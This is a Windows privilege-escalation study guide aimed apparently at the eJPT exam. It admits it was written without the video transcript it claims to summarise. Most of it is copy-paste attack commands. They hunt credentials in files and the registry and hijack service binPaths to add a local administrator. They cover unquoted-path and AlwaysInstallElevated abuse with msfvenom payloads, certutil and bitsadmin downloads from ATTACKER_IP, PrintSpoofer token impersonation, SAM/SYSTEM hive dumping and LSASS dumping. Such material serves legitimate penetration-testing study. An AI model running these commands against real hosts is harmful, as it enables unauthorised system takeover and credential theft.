# What the video covers (Introduction / big picture)

Note: The transcript for “03 - Windows Privilege Escalation.mp4” is not available. The outline below is a conservative, exam-focused summary based on standard eJPT Windows privilege escalation content and typical lab workflows.

Big picture:
- Move from an unprivileged Windows shell/foothold to Administrator/SYSTEM.
- Enumerate OS, users, privileges, services, scheduled tasks, registry, and files for misconfigurations and credentials.
- Exploit common vectors: weak service permissions, unquoted service paths, AlwaysInstallElevated, token impersonation (SeImpersonatePrivilege), scheduled tasks, stored credentials, and (if applicable) missing patches.
- Use mostly native commands, with a few well-known tools (winPEAS, PowerUp/Seatbelt, Sysinternals AccessChk, PrintSpoofer).

# Flow (ordered)

1) Baseline situational awareness
   - Identify current user/groups, privileges, OS/build, network, processes/services.
2) Local privilege reconnaissance
   - Check user rights (whoami /priv), local groups, administrators, sessions.
3) Credential hunting
   - Files, registry (AutoLogon), saved creds (cmdkey), config files.
4) Services review
   - Look for modifiable services, unquoted paths, weak folders/binaries.
5) Scheduled tasks review
   - Tasks running as SYSTEM/Administrator pointing to modifiable files.
6) Installer policy
   - AlwaysInstallElevated registry keys (both HKCU and HKLM).
7) Token impersonation
   - If SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege present, try PrintSpoofer/Juicy/RoguePotato family.
8) Kernel/patch gaps (last resort in exam)
   - Map systeminfo to missing KBs with a suggester (WES-NG) and assess.
9) Execute chosen path to SYSTEM
   - Minimal-impact approach first (token impersonation or service abuse).
10) Post-escalation actions
   - Confirm SYSTEM, dump useful info if allowed, add local admin if needed, clean up.

# Tools highlighted

Native:
- cmd.exe / PowerShell
- whoami, net, sc, schtasks, reg, icacls, findstr, systeminfo, wmic (or Get-CimInstance), cmdkey, runas

Helper/utilities (bring your own):
- winPEASx64.exe (Windows PEAS) for automated enumeration
- Seatbelt.exe / PowerUp.ps1 (priv-esc checks)
- Sysinternals: accesschk.exe (check permissions), procdump.exe (dump lsass, if permitted)
- PrintSpoofer.exe (token impersonation; modern Windows)
- JuicyPotato.exe / RoguePotato (older OSes; requires specific conditions)
- Windows Exploit Suggester NG (WES-NG) on attacker machine
- File transfer helpers: certutil.exe, PowerShell Invoke-WebRequest, curl.exe, bitsadmin.exe

# Typical command walkthrough (detailed, copy-paste friendly)

Assume you have a basic low-priv cmd shell on the target.

Baseline enumeration (cmd)
```
whoami
whoami /groups
whoami /priv
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get HotFixID,InstalledOn
ipconfig /all
route print
arp -a
netstat -ano
query user
set
echo %PATH%
```

Local users and groups
```
net user
net localgroup
net localgroup administrators
```

Processes/services quick look
```
tasklist /v
sc query state= all
```

File system and content discovery (be selective on large drives)
```
dir C:\Users /b
dir "C:\Users\Public\Desktop"
dir "C:\Users\%USERNAME%\Desktop"
dir /s /b "C:\Users\*\Desktop" 2>nul
dir /s /b "C:\Users\*\Documents" 2>nul

findstr /si /i /p "password|pass|pwd|user|login|credential|secret|key" C:\*.txt C:\*.ini C:\*.cfg C:\*.config C:\*.xml 2>nul
findstr /si /i "password|pwd|user|key|secret" "C:\Program Files\*\*.config" "C:\ProgramData\*\*.config" 2>nul
```

Credential artifacts
```
cmdkey /list
type C:\Users\%USERNAME%\Documents\Default.rdp 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

Runas with saved creds (only if cmdkey shows saved creds you can use)
```
runas /savecred /user:.\Administrator "cmd.exe /c whoami && cmd"
```

AlwaysInstallElevated check and exploit
```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both values are 0x1:
- Generate on attacker box:
```
msfvenom -p windows/x64/exec CMD="net localgroup administrators lowuser /add" -f msi -o addadmin.msi
```
- Transfer to victim (example using certutil):
```
certutil -urlcache -f http://ATTACKER_IP/addadmin.msi C:\Windows\Temp\addadmin.msi
msiexec /quiet /qn /i C:\Windows\Temp\addadmin.msi
```

Service enumeration and abuse (modifiable service binPath)
- List details:
```
sc qc "ServiceName"
sc query "ServiceName"
```
- Check unquoted paths (cmd):
```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v /i "C:\Windows\\" 
```
- PowerShell unquoted detection (more reliable):
```
powershell -NoP -C "Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.PathName -notmatch '^\"'} | select Name,DisplayName,PathName | fl"
```
- Check write permissions on folders/binaries:
```
icacls "C:\Program Files\VulnSvc"
icacls "C:\Program Files\VulnSvc\service.exe"
```
- With AccessChk (if available):
```
accesschk.exe -accepteula -ucqv "ServiceName"
accesschk.exe -accepteula -uwdq "Users" "C:\Program Files\VulnSvc"
```
- If you can change the service binPath (SERVICE_CHANGE_CONFIG):
```
sc config "ServiceName" binPath= "cmd.exe /c net localgroup administrators lowuser /add"
sc stop "ServiceName"
sc start "ServiceName"
```
Note: The space after binPath= is required by sc syntax.

Unquoted service path exploitation
- Suppose BINARY_PATH_NAME is: C:\Program Files\Vulnerable Service\service.exe (no quotes)
- Find earliest writable directory in the path; if you can write to C:\ or C:\Program Files\Vulnerable Service\
- Place a malicious Program.exe (or C:\Program.exe) so Windows resolves it first:
  - Generate on attacker:
```
msfvenom -p windows/x64/exec CMD="net localgroup administrators lowuser /add" -f exe -o Program.exe
```
  - Transfer and place accordingly:
```
certutil -urlcache -f http://ATTACKER_IP/Program.exe "C:\Program.exe"
```
- Restart the service:
```
sc stop "ServiceName"
sc start "ServiceName"
```

Scheduled tasks review and abuse
```
schtasks /query /fo LIST /v
```
- Look for “Run As User: SYSTEM” and “Task To Run:” pointing to a file you can modify.
- If you can write to the target binary/script, replace it with a payload and wait/trigger run:
```
schtasks /run /TN "\TaskName"
```

Token impersonation via SeImpersonatePrivilege (PrintSpoofer)
- Check:
```
whoami /priv
```
- If SeImpersonatePrivilege is Enabled:
```
certutil -urlcache -f http://ATTACKER_IP/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd
```
You should get a SYSTEM cmd.

SeBackupPrivilege path (if enabled)
```
whoami /priv
reg save HKLM\SAM C:\Windows\Temp\SAM.bak
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak
```
- Exfiltrate and parse with secretsdump.py offline (attacker):
```
secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
```

Quick PowerShell equivalents (enumeration)
```
powershell -NoP -C "Get-LocalUser; Get-LocalGroupMember Administrators"
powershell -NoP -C "Get-CimInstance Win32_OperatingSystem | fl Caption,Version,BuildNumber"
powershell -NoP -C "Get-Service | ? {$_.Status -eq 'Running'} | select Name,DisplayName,Status | ft -a"
powershell -NoP -C "Get-ScheduledTask | ? {$_.State -ne $null} | fl TaskName,TaskPath,State,Principal,Actions"
powershell -NoP -C "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | fl *"
```

File transfer snippets
```
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe C:\Windows\Temp\winPEAS.exe
powershell -NoP -C "iwr http://ATTACKER_IP/winPEASx64.exe -OutFile C:\Windows\Temp\winPEAS.exe"
bitsadmin /transfer t /download /priority high http://ATTACKER_IP/winPEASx64.exe C:\Windows\Temp\winPEAS.exe
curl.exe -L http://ATTACKER_IP/winPEASx64.exe -o C:\Windows\Temp\winPEAS.exe
```

Automated enumeration (if allowed)
```
C:\Windows\Temp\winPEAS.exe
```

Post-escalation confirmation
```
whoami
whoami /groups
```

# Practical tips

- Prefer low-noise paths: If SeImpersonatePrivilege is enabled, try PrintSpoofer first—quick and low-impact.
- Validate write access before changing services. Use icacls/accesschk and consider potential service outages.
- For sc config, maintain exact spacing: sc config "Name" binPath= "..."
- Unquoted service paths require write access to one of the parent directories; this is less common on modern systems.
- AlwaysInstallElevated requires BOTH HKCU and HKLM set to 1; verify both before using msiexec.
- When using runas /savecred, you need valid saved creds (cmdkey /list). Otherwise it won’t help.
- Keep 32-bit vs 64-bit consistent for tools (use the 64-bit version on 64-bit hosts).
- If dumping LSASS (only if permitted), use procdump64.exe -accepteula -ma lsass.exe lsass.dmp and analyze offline; beware EDR.
- Clean up: remove dropped binaries, restore service configs if modified.
- If WMIC is missing, use PowerShell Get-CimInstance/Get-WmiObject equivalents.

# Minimal cheat sheet (one-screen flow)

Baseline
```
whoami & whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net localgroup administrators
ipconfig /all
```

Creds
```
cmdkey /list
findstr /si /i "password|pwd|user|key|secret" C:\*.config C:\*.txt C:\*.ini 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

Services
```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v /i "C:\Windows\\"
sc qc "ServiceName"
icacls "C:\Path\To\Service\Folder"
```

Exploit (service change)
```
sc config "ServiceName" binPath= "cmd.exe /c net localgroup administrators lowuser /add"
sc stop "ServiceName" & sc start "ServiceName"
```

Scheduled tasks
```
schtasks /query /fo LIST /v
```

AlwaysInstallElevated
```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\Temp\payload.msi
```

Token impersonation
```
whoami /priv
PrintSpoofer64.exe -i -c cmd
```

Transfer
```
certutil -urlcache -f http://ATTACKER_IP/tool.exe C:\Windows\Temp\tool.exe
```

# Summary

Without the transcript, this summary lays out a standard eJPT-ready methodology for Windows privilege escalation: enumerate thoroughly, hunt credentials, inspect services and scheduled tasks, check installer policies, and leverage token impersonation when available. The commands above are copy/paste-ready and cover the most common, reliable escalation vectors you’ll encounter in exam-style Windows targets.